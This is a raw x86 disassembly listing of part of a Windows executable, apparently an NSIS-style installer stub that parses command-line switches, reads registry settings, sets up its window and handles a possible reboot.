  40329e:	68 00 2f 42 00       	push   $0x422f00
  4032a3:	e8 c2 2c 00 00       	call   0x405f6a
  4032a8:	ff 15 94 70 40 00    	call   *0x407094
  4032ae:	bd 00 90 42 00       	mov    $0x429000,%ebp
  4032b3:	50                   	push   %eax
  4032b4:	55                   	push   %ebp
  4032b5:	e8 b0 2c 00 00       	call   0x405f6a
  4032ba:	80 3d 00 90 42 00 22 	cmpb   $0x22,0x429000
  4032c1:	c7 05 00 37 42 00 00 	movl   $0x400000,0x423700
  4032c8:	00 40 00 
  4032cb:	8b c5                	mov    %ebp,%eax
  4032cd:	75 0a                	jne    0x4032d9
  4032cf:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  4032d4:	b8 01 90 42 00       	mov    $0x429001,%eax
  4032d9:	ff 74 24 14          	push   0x14(%esp)
  4032dd:	50                   	push   %eax
  4032de:	e8 4a 26 00 00       	call   0x40592d
  4032e3:	50                   	push   %eax
  4032e4:	ff 15 30 72 40 00    	call   *0x407230
  4032ea:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4032ee:	e9 c0 00 00 00       	jmp    0x4033b3
  4032f3:	80 f9 20             	cmp    $0x20,%cl
  4032f6:	75 06                	jne    0x4032fe
  4032f8:	40                   	inc    %eax
  4032f9:	80 38 20             	cmpb   $0x20,(%eax)
  4032fc:	74 fa                	je     0x4032f8
  4032fe:	80 38 22             	cmpb   $0x22,(%eax)
  403301:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  403306:	75 06                	jne    0x40330e
  403308:	40                   	inc    %eax
  403309:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  40330e:	80 38 2f             	cmpb   $0x2f,(%eax)
  403311:	0f 85 8c 00 00 00    	jne    0x4033a3
  403317:	40                   	inc    %eax
  403318:	80 38 53             	cmpb   $0x53,(%eax)
  40331b:	75 16                	jne    0x403333
  40331d:	8a 48 01             	mov    0x1(%eax),%cl
  403320:	80 f9 20             	cmp    $0x20,%cl
  403323:	74 04                	je     0x403329
  403325:	3a cb                	cmp    %bl,%cl
  403327:	75 0a                	jne    0x403333
  403329:	c7 05 c0 37 42 00 01 	movl   $0x1,0x4237c0
  403330:	00 00 00 
  403333:	0f be 0d 83 91 40 00 	movsbl 0x409183,%ecx
  40333a:	0f be 15 82 91 40 00 	movsbl 0x409182,%edx
  403341:	c1 e1 08             	shl    $0x8,%ecx
  403344:	0b ca                	or     %edx,%ecx
  403346:	0f be 15 81 91 40 00 	movsbl 0x409181,%edx
  40334d:	c1 e1 08             	shl    $0x8,%ecx
  403350:	0b ca                	or     %edx,%ecx
  403352:	0f be 15 80 91 40 00 	movsbl 0x409180,%edx
  403359:	c1 e1 08             	shl    $0x8,%ecx
  40335c:	0b ca                	or     %edx,%ecx
  40335e:	39 08                	cmp    %ecx,(%eax)
  403360:	75 11                	jne    0x403373
  403362:	8a 48 04             	mov    0x4(%eax),%cl
  403365:	80 f9 20             	cmp    $0x20,%cl
  403368:	74 04                	je     0x40336e
  40336a:	3a cb                	cmp    %bl,%cl
  40336c:	75 05                	jne    0x403373
  40336e:	83 4c 24 20 04       	orl    $0x4,0x20(%esp)
  403373:	0f be 0d 7b 91 40 00 	movsbl 0x40917b,%ecx
  40337a:	0f be 15 7a 91 40 00 	movsbl 0x40917a,%edx
  403381:	c1 e1 08             	shl    $0x8,%ecx
  403384:	0b ca                	or     %edx,%ecx
  403386:	0f be 15 79 91 40 00 	movsbl 0x409179,%edx
  40338d:	c1 e1 08             	shl    $0x8,%ecx
  403390:	0b ca                	or     %edx,%ecx
  403392:	0f be 15 78 91 40 00 	movsbl 0x409178,%edx
  403399:	c1 e1 08             	shl    $0x8,%ecx
  40339c:	0b ca                	or     %edx,%ecx
  40339e:	39 48 fe             	cmp    %ecx,-0x2(%eax)
  4033a1:	74 1c                	je     0x4033bf
  4033a3:	ff 74 24 14          	push   0x14(%esp)
  4033a7:	50                   	push   %eax
  4033a8:	e8 80 25 00 00       	call   0x40592d
  4033ad:	80 38 22             	cmpb   $0x22,(%eax)
  4033b0:	75 01                	jne    0x4033b3
  4033b2:	40                   	inc    %eax
  4033b3:	8a 08                	mov    (%eax),%cl
  4033b5:	3a cb                	cmp    %bl,%cl
  4033b7:	0f 85 36 ff ff ff    	jne    0x4032f3
  4033bd:	eb 11                	jmp    0x4033d0
  4033bf:	88 58 fe             	mov    %bl,-0x2(%eax)
  4033c2:	83 c0 02             	add    $0x2,%eax
  4033c5:	50                   	push   %eax
  4033c6:	68 00 94 42 00       	push   $0x429400
  4033cb:	e8 9a 2b 00 00       	call   0x405f6a
  4033d0:	8b 3d 70 70 40 00    	mov    0x407070,%edi
  4033d6:	be 00 a4 42 00       	mov    $0x42a400,%esi
  4033db:	56                   	push   %esi
  4033dc:	68 00 04 00 00       	push   $0x400
  4033e1:	ff d7                	call   *%edi
  4033e3:	e8 bd fd ff ff       	call   0x4031a5
  4033e8:	85 c0                	test   %eax,%eax
  4033ea:	75 56                	jne    0x403442
  4033ec:	68 fb 03 00 00       	push   $0x3fb
  4033f1:	56                   	push   %esi
  4033f2:	ff 15 b0 70 40 00    	call   *0x4070b0
  4033f8:	68 70 91 40 00       	push   $0x409170
  4033fd:	56                   	push   %esi
  4033fe:	e8 83 2b 00 00       	call   0x405f86
  403403:	e8 9d fd ff ff       	call   0x4031a5
  403408:	85 c0                	test   %eax,%eax
  40340a:	75 36                	jne    0x403442
  40340c:	56                   	push   %esi
  40340d:	68 fc 03 00 00       	push   $0x3fc
  403412:	ff d7                	call   *%edi
  403414:	68 6c 91 40 00       	push   $0x40916c
  403419:	56                   	push   %esi
  40341a:	e8 67 2b 00 00       	call   0x405f86
  40341f:	8b 3d 88 70 40 00    	mov    0x407088,%edi
  403425:	56                   	push   %esi
  403426:	68 64 91 40 00       	push   $0x409164
  40342b:	ff d7                	call   *%edi
  40342d:	56                   	push   %esi
  40342e:	68 60 91 40 00       	push   $0x409160
  403433:	ff d7                	call   *%edi
  403435:	e8 6b fd ff ff       	call   0x4031a5
  40343a:	85 c0                	test   %eax,%eax
  40343c:	0f 84 ae 00 00 00    	je     0x4034f0
  403442:	68 00 a0 42 00       	push   $0x42a000
  403447:	ff 15 30 71 40 00    	call   *0x407130
  40344d:	ff 74 24 20          	push   0x20(%esp)
  403451:	e8 0d f9 ff ff       	call   0x402d63
  403456:	3b c3                	cmp    %ebx,%eax
  403458:	89 44 24 10          	mov    %eax,0x10(%esp)
  40345c:	0f 85 8e 00 00 00    	jne    0x4034f0
  403462:	39 1d 20 37 42 00    	cmp    %ebx,0x423720
  403468:	74 76                	je     0x4034e0
  40346a:	53                   	push   %ebx
  40346b:	55                   	push   %ebp
  40346c:	e8 bc 24 00 00       	call   0x40592d
  403471:	8b f8                	mov    %eax,%edi
  403473:	3b fd                	cmp    %ebp,%edi
  403475:	72 34                	jb     0x4034ab
  403477:	0f be 05 5b 91 40 00 	movsbl 0x40915b,%eax
  40347e:	0f be 0d 5a 91 40 00 	movsbl 0x40915a,%ecx
  403485:	c1 e0 08             	shl    $0x8,%eax
  403488:	0b c1                	or     %ecx,%eax
  40348a:	0f be 0d 59 91 40 00 	movsbl 0x409159,%ecx
  403491:	c1 e0 08             	shl    $0x8,%eax
  403494:	0b c1                	or     %ecx,%eax
  403496:	0f be 0d 58 91 40 00 	movsbl 0x409158,%ecx
  40349d:	c1 e0 08             	shl    $0x8,%eax
  4034a0:	0b c1                	or     %ecx,%eax
  4034a2:	39 07                	cmp    %eax,(%edi)
  4034a4:	74 05                	je     0x4034ab
  4034a6:	4f                   	dec    %edi
  4034a7:	3b fd                	cmp    %ebp,%edi
  4034a9:	73 f7                	jae    0x4034a2
  4034ab:	3b fd                	cmp    %ebp,%edi
  4034ad:	c7 44 24 10 04 91 40 	movl   $0x409104,0x10(%esp)
  4034b4:	00 
  4034b5:	72 65                	jb     0x40351c
  4034b7:	88 1f                	mov    %bl,(%edi)
  4034b9:	83 c7 04             	add    $0x4,%edi
  4034bc:	57                   	push   %edi
  4034bd:	e8 2e 25 00 00       	call   0x4059f0
  4034c2:	85 c0                	test   %eax,%eax
  4034c4:	74 2a                	je     0x4034f0
  4034c6:	57                   	push   %edi
  4034c7:	68 00 94 42 00       	push   $0x429400
  4034cc:	e8 99 2a 00 00       	call   0x405f6a
  4034d1:	57                   	push   %edi
  4034d2:	68 00 98 42 00       	push   $0x429800
  4034d7:	e8 8e 2a 00 00       	call   0x405f6a
  4034dc:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4034e0:	83 0d cc 37 42 00 ff 	orl    $0xffffffff,0x4237cc
  4034e7:	e8 ac 02 00 00       	call   0x403798
  4034ec:	89 44 24 18          	mov    %eax,0x18(%esp)
  4034f0:	e8 c9 01 00 00       	call   0x4036be
  4034f5:	ff 15 84 72 40 00    	call   *0x407284
  4034fb:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4034ff:	5d                   	pop    %ebp
  403500:	0f 84 1e 01 00 00    	je     0x403624
  403506:	68 10 00 20 00       	push   $0x200010
  40350b:	ff 74 24 10          	push   0x10(%esp)
  40350f:	e8 72 21 00 00       	call   0x405686
  403514:	6a 02                	push   $0x2
  403516:	ff 15 84 70 40 00    	call   *0x407084
  40351c:	e8 d0 20 00 00       	call   0x4055f1
  403521:	68 50 91 40 00       	push   $0x409150
  403526:	56                   	push   %esi
  403527:	8b f8                	mov    %eax,%edi
  403529:	e8 58 2a 00 00       	call   0x405f86
  40352e:	3b fb                	cmp    %ebx,%edi
  403530:	74 0b                	je     0x40353d
  403532:	68 4c 91 40 00       	push   $0x40914c
  403537:	56                   	push   %esi
  403538:	e8 49 2a 00 00       	call   0x405f86
  40353d:	68 44 91 40 00       	push   $0x409144
  403542:	56                   	push   %esi
  403543:	e8 3e 2a 00 00       	call   0x405f86
  403548:	bd 00 9c 42 00       	mov    $0x429c00,%ebp
  40354d:	55                   	push   %ebp
  40354e:	56                   	push   %esi
  40354f:	ff 15 18 71 40 00    	call   *0x407118
  403555:	85 c0                	test   %eax,%eax
  403557:	74 97                	je     0x4034f0
  403559:	3b fb                	cmp    %ebx,%edi
  40355b:	56                   	push   %esi
  40355c:	74 07                	je     0x403565
  40355e:	e8 f4 1f 00 00       	call   0x405557
  403563:	eb 05                	jmp    0x40356a
  403565:	e8 6a 20 00 00       	call   0x4055d4
  40356a:	56                   	push   %esi
  40356b:	ff 15 b4 70 40 00    	call   *0x4070b4
  403571:	38 1d 00 94 42 00    	cmp    %bl,0x429400
  403577:	75 0b                	jne    0x403584
  403579:	55                   	push   %ebp
  40357a:	68 00 94 42 00       	push   $0x429400
  40357f:	e8 e6 29 00 00       	call   0x405f6a
  403584:	ff 74 24 1c          	push   0x1c(%esp)
  403588:	68 00 40 42 00       	push   $0x424000
  40358d:	e8 d8 29 00 00       	call   0x405f6a
  403592:	66 0f be 0d 40 91 40 	movsbw 0x409140,%cx
  403599:	00 
  40359a:	33 c0                	xor    %eax,%eax
  40359c:	6a 1a                	push   $0x1a
  40359e:	8a 25 41 91 40 00    	mov    0x409141,%ah
  4035a4:	5d                   	pop    %ebp
  4035a5:	0b c1                	or     %ecx,%eax
  4035a7:	bf c8 e8 41 00       	mov    $0x41e8c8,%edi
  4035ac:	66 a3 00 44 42 00    	mov    %ax,0x424400
  4035b2:	a1 14 37 42 00       	mov    0x423714,%eax
  4035b7:	ff b0 20 01 00 00    	push   0x120(%eax)
  4035bd:	57                   	push   %edi
  4035be:	e8 c9 29 00 00       	call   0x405f8c
  4035c3:	57                   	push   %edi
  4035c4:	ff 15 30 71 40 00    	call   *0x407130
  4035ca:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4035ce:	74 3f                	je     0x40360f
  4035d0:	6a 01                	push   $0x1
  4035d2:	57                   	push   %edi
  4035d3:	68 00 ac 42 00       	push   $0x42ac00
  4035d8:	ff 15 80 70 40 00    	call   *0x407080
  4035de:	85 c0                	test   %eax,%eax
  4035e0:	74 2d                	je     0x40360f
  4035e2:	53                   	push   %ebx
  4035e3:	57                   	push   %edi
  4035e4:	e8 60 27 00 00       	call   0x405d49
  4035e9:	a1 14 37 42 00       	mov    0x423714,%eax
  4035ee:	ff b0 24 01 00 00    	push   0x124(%eax)
  4035f4:	57                   	push   %edi
  4035f5:	e8 92 29 00 00       	call   0x405f8c
  4035fa:	57                   	push   %edi
  4035fb:	e8 09 20 00 00       	call   0x405609
  403600:	3b c3                	cmp    %ebx,%eax
  403602:	74 0b                	je     0x40360f
  403604:	50                   	push   %eax
  403605:	ff 15 14 71 40 00    	call   *0x407114
  40360b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40360f:	fe 05 00 44 42 00    	incb   0x424400
  403615:	4d                   	dec    %ebp
  403616:	75 9a                	jne    0x4035b2
  403618:	53                   	push   %ebx
  403619:	56                   	push   %esi
  40361a:	e8 2a 27 00 00       	call   0x405d49
  40361f:	e9 cc fe ff ff       	jmp    0x4034f0
  403624:	39 1d b4 37 42 00    	cmp    %ebx,0x4237b4
  40362a:	74 7a                	je     0x4036a6
  40362c:	8d 44 24 18          	lea    0x18(%esp),%eax
  403630:	50                   	push   %eax
  403631:	6a 28                	push   $0x28
  403633:	ff 15 7c 70 40 00    	call   *0x40707c
  403639:	50                   	push   %eax
  40363a:	ff 15 10 70 40 00    	call   *0x407010
  403640:	6a 02                	push   $0x2
  403642:	85 c0                	test   %eax,%eax
  403644:	5f                   	pop    %edi
  403645:	74 30                	je     0x403677
  403647:	8d 44 24 24          	lea    0x24(%esp),%eax
  40364b:	50                   	push   %eax
  40364c:	68 2c 91 40 00       	push   $0x40912c
  403651:	53                   	push   %ebx
  403652:	ff 15 14 70 40 00    	call   *0x407014
  403658:	53                   	push   %ebx
  403659:	53                   	push   %ebx
  40365a:	8d 44 24 28          	lea    0x28(%esp),%eax
  40365e:	53                   	push   %ebx
  40365f:	50                   	push   %eax
  403660:	53                   	push   %ebx
  403661:	ff 74 24 2c          	push   0x2c(%esp)
  403665:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  40366c:	00 
  40366d:	89 7c 24 44          	mov    %edi,0x44(%esp)
  403671:	ff 15 00 70 40 00    	call   *0x407000
  403677:	6a 04                	push   $0x4
  403679:	e8 84 2c 00 00       	call   0x406302
  40367e:	3b c3                	cmp    %ebx,%eax
  403680:	be 02 00 04 80       	mov    $0x80040002,%esi
  403685:	74 0c                	je     0x403693
  403687:	56                   	push   %esi
  403688:	6a 25                	push   $0x25
  40368a:	53                   	push   %ebx
  40368b:	53                   	push   %ebx
  40368c:	53                   	push   %ebx
  40368d:	ff d0                	call   *%eax
  40368f:	85 c0                	test   %eax,%eax
  403691:	74 0c                	je     0x40369f
  403693:	56                   	push   %esi
  403694:	57                   	push   %edi
  403695:	ff 15 34 72 40 00    	call   *0x407234
  40369b:	85 c0                	test   %eax,%eax
  40369d:	75 07                	jne    0x4036a6
  40369f:	6a 09                	push   $0x9
  4036a1:	e8 65 dd ff ff       	call   0x40140b
  4036a6:	a1 cc 37 42 00       	mov    0x4237cc,%eax
  4036ab:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036ae:	74 04                	je     0x4036b4
  4036b0:	89 44 24 14          	mov    %eax,0x14(%esp)
  4036b4:	ff 74 24 14          	push   0x14(%esp)
  4036b8:	ff 15 84 70 40 00    	call   *0x407084
  4036be:	a1 18 90 40 00       	mov    0x409018,%eax
  4036c3:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036c6:	74 0e                	je     0x4036d6
  4036c8:	50                   	push   %eax
  4036c9:	ff 15 14 71 40 00    	call   *0x407114
  4036cf:	83 0d 18 90 40 00 ff 	orl    $0xffffffff,0x409018
  4036d6:	e8 28 00 00 00       	call   0x403703
  4036db:	6a 07                	push   $0x7
  4036dd:	68 00 a8 42 00       	push   $0x42a800
  4036e2:	e8 4b 20 00 00       	call   0x405732
  4036e7:	c3                   	ret
  4036e8:	56                   	push   %esi
  4036e9:	8b 35 cc ec 41 00    	mov    0x41eccc,%esi
  4036ef:	eb 0a                	jmp    0x4036fb
  4036f1:	ff 74 24 08          	push   0x8(%esp)
  4036f5:	ff 56 04             	call   *0x4(%esi)
  4036f8:	8b 36                	mov    (%esi),%esi
  4036fa:	59                   	pop    %ecx
  4036fb:	85 f6                	test   %esi,%esi
  4036fd:	75 f2                	jne    0x4036f1
  4036ff:	5e                   	pop    %esi
  403700:	c2 04 00             	ret    $0x4
  403703:	56                   	push   %esi
  403704:	8b 35 cc ec 41 00    	mov    0x41eccc,%esi
  40370a:	6a 00                	push   $0x0
  40370c:	e8 d7 ff ff ff       	call   0x4036e8
  403711:	85 f6                	test   %esi,%esi
  403713:	74 1a                	je     0x40372f
  403715:	57                   	push   %edi
  403716:	8b fe                	mov    %esi,%edi
  403718:	8b 36                	mov    (%esi),%esi
  40371a:	ff 77 08             	push   0x8(%edi)
  40371d:	ff 15 44 71 40 00    	call   *0x407144
  403723:	57                   	push   %edi
  403724:	ff 15 5c 71 40 00    	call   *0x40715c
  40372a:	85 f6                	test   %esi,%esi
  40372c:	75 e8                	jne    0x403716
  40372e:	5f                   	pop    %edi
  40372f:	83 25 cc ec 41 00 00 	andl   $0x0,0x41eccc
  403736:	5e                   	pop    %esi
  403737:	c3                   	ret
  403738:	a1 cc ec 41 00       	mov    0x41eccc,%eax
  40373d:	eb 0b                	jmp    0x40374a
  40373f:	8b 48 08             	mov    0x8(%eax),%ecx
  403742:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403746:	74 0a                	je     0x403752
  403748:	8b 00                	mov    (%eax),%eax
  40374a:	85 c0                	test   %eax,%eax
  40374c:	75 f1                	jne    0x40373f
  40374e:	40                   	inc    %eax
  40374f:	c2 04 00             	ret    $0x4
  403752:	33 c0                	xor    %eax,%eax
  403754:	eb f9                	jmp    0x40374f
  403756:	56                   	push   %esi
  403757:	8b 74 24 08          	mov    0x8(%esp),%esi
  40375b:	56                   	push   %esi
  40375c:	e8 d7 ff ff ff       	call   0x403738
  403761:	85 c0                	test   %eax,%eax
  403763:	75 03                	jne    0x403768
  403765:	40                   	inc    %eax
  403766:	eb 2c                	jmp    0x403794
  403768:	6a 0c                	push   $0xc
  40376a:	6a 40                	push   $0x40
  40376c:	ff 15 58 71 40 00    	call   *0x407158
  403772:	85 c0                	test   %eax,%eax
  403774:	74 1b                	je     0x403791
  403776:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40377a:	89 70 08             	mov    %esi,0x8(%eax)
  40377d:	89 48 04             	mov    %ecx,0x4(%eax)
  403780:	8b 0d cc ec 41 00    	mov    0x41eccc,%ecx
  403786:	89 08                	mov    %ecx,(%eax)
  403788:	a3 cc ec 41 00       	mov    %eax,0x41eccc
  40378d:	33 c0                	xor    %eax,%eax
  40378f:	eb 03                	jmp    0x403794
  403791:	83 c8 ff             	or     $0xffffffff,%eax
  403794:	5e                   	pop    %esi
  403795:	c2 08 00             	ret    $0x8
  403798:	83 ec 10             	sub    $0x10,%esp
  40379b:	53                   	push   %ebx
  40379c:	55                   	push   %ebp
  40379d:	56                   	push   %esi
  40379e:	8b 35 14 37 42 00    	mov    0x423714,%esi
  4037a4:	57                   	push   %edi
  4037a5:	6a 02                	push   $0x2
  4037a7:	e8 56 2b 00 00       	call   0x406302
  4037ac:	33 db                	xor    %ebx,%ebx
  4037ae:	3b c3                	cmp    %ebx,%eax
  4037b0:	74 12                	je     0x4037c4
  4037b2:	ff d0                	call   *%eax
  4037b4:	0f b7 c0             	movzwl %ax,%eax
  4037b7:	50                   	push   %eax
  4037b8:	68 00 a0 42 00       	push   $0x42a000
  4037bd:	e8 06 27 00 00       	call   0x405ec8
  4037c2:	eb 54                	jmp    0x403818
  4037c4:	bf 08 fd 41 00       	mov    $0x41fd08,%edi
  4037c9:	53                   	push   %ebx
  4037ca:	57                   	push   %edi
  4037cb:	53                   	push   %ebx
  4037cc:	68 44 73 40 00       	push   $0x407344
  4037d1:	68 01 00 00 80       	push   $0x80000001
  4037d6:	c6 05 00 a0 42 00 30 	movb   $0x30,0x42a000
  4037dd:	c6 05 01 a0 42 00 78 	movb   $0x78,0x42a001
  4037e4:	88 1d 02 a0 42 00    	mov    %bl,0x42a002
  4037ea:	e8 62 26 00 00       	call   0x405e51
  4037ef:	38 1d 08 fd 41 00    	cmp    %bl,0x41fd08
  4037f5:	75 16                	jne    0x40380d
  4037f7:	53                   	push   %ebx
  4037f8:	57                   	push   %edi
  4037f9:	68 62 73 40 00       	push   $0x407362
  4037fe:	68 1c 73 40 00       	push   $0x40731c
  403803:	68 03 00 00 80       	push   $0x80000003
  403808:	e8 44 26 00 00       	call   0x405e51
  40380d:	57                   	push   %edi
  40380e:	68 00 a0 42 00       	push   $0x42a000
  403813:	e8 6e 27 00 00       	call   0x405f86
  403818:	e8 40 02 00 00       	call   0x403a5d
  40381d:	a1 1c 37 42 00       	mov    0x42371c,%eax
  403822:	bd 00 94 42 00       	mov    $0x429400,%ebp
  403827:	83 e0 20             	and    $0x20,%eax
  40382a:	55                   	push   %ebp
  40382b:	a3 a0 37 42 00       	mov    %eax,0x4237a0
  403830:	c7 05 bc 37 42 00 00 	movl   $0x10000,0x4237bc
  403837:	00 01 00 
  40383a:	e8 b1 21 00 00       	call   0x4059f0
  40383f:	85 c0                	test   %eax,%eax
  403841:	0f 85 81 00 00 00    	jne    0x4038c8
  403847:	8b 4e 48             	mov    0x48(%esi),%ecx
  40384a:	3b cb                	cmp    %ebx,%ecx
  40384c:	74 7a                	je     0x4038c8
  40384e:	8b 56 4c             	mov    0x4c(%esi),%edx
  403851:	a1 58 37 42 00       	mov    0x423758,%eax
  403856:	bf a0 26 42 00       	mov    $0x4226a0,%edi
  40385b:	53                   	push   %ebx
  40385c:	03 d0                	add    %eax,%edx
  40385e:	57                   	push   %edi
  40385f:	03 c8                	add    %eax,%ecx
  403861:	52                   	push   %edx
  403862:	51                   	push   %ecx
  403863:	ff 76 44             	push   0x44(%esi)
  403866:	e8 e6 25 00 00       	call   0x405e51
  40386b:	a0 a0 26 42 00       	mov    0x4226a0,%al
  403870:	3a c3                	cmp    %bl,%al
  403872:	74 54                	je     0x4038c8
  403874:	3c 22                	cmp    $0x22,%al
  403876:	75 0f                	jne    0x403887
  403878:	bf a1 26 42 00       	mov    $0x4226a1,%edi
  40387d:	6a 22                	push   $0x22
  40387f:	57                   	push   %edi
  403880:	e8 a8 20 00 00       	call   0x40592d
  403885:	88 18                	mov    %bl,(%eax)
  403887:	57                   	push   %edi
  403888:	e8 f3 26 00 00       	call   0x405f80
  40388d:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403891:	3b c7                	cmp    %edi,%eax
  403893:	76 26                	jbe    0x4038bb
  403895:	68 f8 91 40 00       	push   $0x4091f8
  40389a:	50                   	push   %eax
  40389b:	ff 15 18 71 40 00    	call   *0x407118
  4038a1:	85 c0                	test   %eax,%eax
  4038a3:	75 16                	jne    0x4038bb
  4038a5:	57                   	push   %edi
  4038a6:	ff 15 fc 70 40 00    	call   *0x4070fc
  4038ac:	83 f8 ff             	cmp    $0xffffffff,%eax
  4038af:	74 04                	je     0x4038b5
  4038b1:	a8 10                	test   $0x10,%al
  4038b3:	75 06                	jne    0x4038bb
  4038b5:	57                   	push   %edi
  4038b6:	e8 8e 20 00 00       	call   0x405949
  4038bb:	57                   	push   %edi
  4038bc:	e8 41 20 00 00       	call   0x405902
  4038c1:	50                   	push   %eax
  4038c2:	55                   	push   %ebp
  4038c3:	e8 a2 26 00 00       	call   0x405f6a
  4038c8:	55                   	push   %ebp
  4038c9:	e8 22 21 00 00       	call   0x4059f0
  4038ce:	85 c0                	test   %eax,%eax
  4038d0:	75 0c                	jne    0x4038de
  4038d2:	ff b6 18 01 00 00    	push   0x118(%esi)
  4038d8:	55                   	push   %ebp
  4038d9:	e8 ae 26 00 00       	call   0x405f8c
  4038de:	68 40 80 00 00       	push   $0x8040
  4038e3:	53                   	push   %ebx
  4038e4:	53                   	push   %ebx
  4038e5:	6a 01                	push   $0x1
  4038e7:	6a 67                	push   $0x67
  4038e9:	ff 35 00 37 42 00    	push   0x423700
  4038ef:	ff 15 50 72 40 00    	call   *0x407250
  4038f5:	a3 e8 2e 42 00       	mov    %eax,0x422ee8
  4038fa:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  4038fe:	bf a0 2e 42 00       	mov    $0x422ea0,%edi
  403903:	74 7f                	je     0x403984
  403905:	8b 0d 00 37 42 00    	mov    0x423700,%ecx
  40390b:	be f4 91 40 00       	mov    $0x4091f4,%esi
  403910:	57                   	push   %edi
  403911:	c7 05 a4 2e 42 00 00 	movl   $0x401000,0x422ea4
  403918:	10 40 00 
  40391b:	89 0d b0 2e 42 00    	mov    %ecx,0x422eb0
  403921:	a3 b4 2e 42 00       	mov    %eax,0x422eb4
  403926:	89 35 c4 2e 42 00    	mov    %esi,0x422ec4
  40392c:	ff 15 1c 72 40 00    	call   *0x40721c
  403932:	66 85 c0             	test   %ax,%ax
  403935:	0f 84 18 01 00 00    	je     0x403a53
  40393b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40393f:	53                   	push   %ebx
  403940:	50                   	push   %eax
  403941:	53                   	push   %ebx
  403942:	6a 30                	push   $0x30
  403944:	ff 15 20 72 40 00    	call   *0x407220
  40394a:	53                   	push   %ebx
  40394b:	ff 35 00 37 42 00    	push   0x423700
  403951:	8b 44 24 24          	mov    0x24(%esp),%eax
  403955:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403959:	53                   	push   %ebx
  40395a:	53                   	push   %ebx
  40395b:	50                   	push   %eax
  40395c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403960:	2b 44 24 24          	sub    0x24(%esp),%eax
  403964:	50                   	push   %eax
  403965:	ff 74 24 2c          	push   0x2c(%esp)
  403969:	ff 74 24 2c          	push   0x2c(%esp)
  40396d:	68 00 00 00 80       	push   $0x80000000
  403972:	53                   	push   %ebx
  403973:	56                   	push   %esi
  403974:	68 80 00 00 00       	push   $0x80
  403979:	ff 15 24 72 40 00    	call   *0x407224
  40397f:	a3 e8 fc 41 00       	mov    %eax,0x41fce8
  403984:	53                   	push   %ebx
  403985:	e8 81 da ff ff       	call   0x40140b
  40398a:	85 c0                	test   %eax,%eax
  40398c:	74 08                	je     0x403996
  40398e:	6a 02                	push   $0x2
  403990:	58                   	pop    %eax
  403991:	e9 bf 00 00 00       	jmp    0x403a55
  403996:	e8 c2 00 00 00       	call   0x403a5d
  40399b:	39 1d c0 37 42 00    	cmp    %ebx,0x4237c0
  4039a1:	0f 85 83 00 00 00    	jne    0x403a2a
  4039a7:	6a 05                	push   $0x5
  4039a9:	ff 35 e8 fc 41 00    	push   0x41fce8
  4039af:	ff 15 78 72 40 00    	call   *0x407278
  4039b5:	68 10 73 40 00       	push   $0x407310
  4039ba:	e8 d5 28 00 00       	call   0x406294
  4039bf:	85 c0                	test   %eax,%eax
  4039c1:	75 0a                	jne    0x4039cd
  4039c3:	68 04 73 40 00       	push   $0x407304
  4039c8:	e8 c7 28 00 00       	call   0x406294
  4039cd:	8b 35 28 72 40 00    	mov    0x407228,%esi
  4039d3:	bd f8 72 40 00       	mov    $0x4072f8,%ebp
  4039d8:	57                   	push   %edi
  4039d9:	55                   	push   %ebp
  4039da:	53                   	push   %ebx
  4039db:	ff d6                	call   *%esi
  4039dd:	85 c0                	test   %eax,%eax
  4039df:	75 16                	jne    0x4039f7
  4039e1:	57                   	push   %edi
  4039e2:	68 ec 72 40 00       	push   $0x4072ec
  4039e7:	53                   	push   %ebx
  4039e8:	ff d6                	call   *%esi
  4039ea:	57                   	push   %edi
  4039eb:	89 2d c4 2e 42 00    	mov    %ebp,0x422ec4
  4039f1:	ff 15 1c 72 40 00    	call   *0x40721c
  4039f7:	a1 e0 2e 42 00       	mov    0x422ee0,%eax
  4039fc:	53                   	push   %ebx
  4039fd:	83 c0 69             	add    $0x69,%eax
  403a00:	68 35 3b 40 00       	push   $0x403b35
  403a05:	0f b7 c0             	movzwl %ax,%eax
  403a08:	53                   	push   %ebx
  403a09:	50                   	push   %eax
  403a0a:	ff 35 00 37 42 00    	push   0x423700
  403a10:	ff 15 2c 72 40 00    	call   *0x40722c
  403a16:	6a 05                	push   $0x5
  403a18:	8b f0                	mov    %eax,%esi
  403a1a:	e8 ec d9 ff ff       	call   0x40140b
  403a1f:	6a 01                	push   $0x1
  403a21:	e8 c2 fc ff ff       	call   0x4036e8
  403a26:	8b c6                	mov    %esi,%eax
  403a28:	eb 2b                	jmp    0x403a55
  403a2a:	53                   	push   %ebx
  403a2b:	e8 33 17 00 00       	call   0x405163
  403a30:	85 c0                	test   %eax,%eax
  403a32:	74 18                	je     0x403a4c
  403a34:	39 1d cc 2e 42 00    	cmp    %ebx,0x422ecc
  403a3a:	0f 85 4e ff ff ff    	jne    0x40398e
  403a40:	6a 02                	push   $0x2
  403a42:	e8 c4 d9 ff ff       	call   0x40140b
  403a47:	e9 42 ff ff ff       	jmp    0x40398e
  403a4c:	6a 01                	push   $0x1
  403a4e:	e8 b8 d9 ff ff       	call   0x40140b
  403a53:	33 c0                	xor    %eax,%eax
  403a55:	5f                   	pop    %edi
  403a56:	5e                   	pop    %esi
  403a57:	5d                   	pop    %ebp
  403a58:	5b                   	pop    %ebx
  403a59:	83 c4 10             	add    $0x10,%esp
  403a5c:	c3                   	ret
  403a5d:	53                   	push   %ebx
  403a5e:	55                   	push   %ebp
  403a5f:	56                   	push   %esi
  403a60:	57                   	push   %edi
  403a61:	bf 00 a0 42 00       	mov    $0x42a000,%edi
  403a66:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403a6b:	57                   	push   %edi
